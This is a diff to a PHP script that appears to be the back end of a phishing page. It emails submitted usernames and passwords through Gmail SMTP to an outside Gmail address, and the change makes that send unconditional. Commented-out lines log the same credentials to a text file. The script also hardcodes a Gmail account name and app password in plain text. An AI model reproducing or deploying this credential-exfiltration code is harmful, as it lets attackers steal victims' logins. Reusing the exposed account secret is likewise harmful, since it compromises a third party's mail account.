@@ -10,29 +10,29 @@ use PHPMailer\PHPMailer\SMTP;
 // require 'phpmailer/src/PHPMailer.php';
 // require 'phpmailer/src/SMTP.php';
 
-if(isser($_POST['username'])){
-    $mail = new PHPMailer(true);
 
-    $mail->isSMTP();
-    $mail->Host = 'smtp.gmail.com';
-    $mail->SMTPAuth = true;
-    $mail->Username = 'mrsterixmr@gmail.com';
-    $mail->Password = 'ppamjhevewmihvqz';
-    $mail->SMTPSecure = 'ssl';
-    $mail->Port = 465;
+$mail = new PHPMailer(true);
 
-    $mail->setFrom('mrsterixmr@gmail.com');
+$mail->isSMTP();
+$mail->Host = 'smtp.gmail.com';
+$mail->SMTPAuth = true;
+$mail->Username = 'mrsterixmr@gmail.com';
+$mail->Password = 'ppamjhevewmihvqz';
+$mail->SMTPSecure = 'ssl';
+$mail->Port = 465;
 
-    $mail->addAddress("Nikibestshark@gmail.com");
+$mail->setFrom('mrsterixmr@gmail.com');
 
-    $mail->isHTML(true);
+$mail->addAddress("Nikibestshark@gmail.com");
 
-    $mail->Subject = $username;
-    $mail->Body = $password;
-   
-    $mail->send();
+$mail->isHTML(true);
 
-}
+$mail->Subject = $username;
+$mail->Body = $password;
+
+$mail->send();
+
+
 // $fp = fopen('data.txt', 'a+');
 // fwrite($fp, "login - ". $username."\n");
 // fwrite($fp, "password - ". $password."\n");
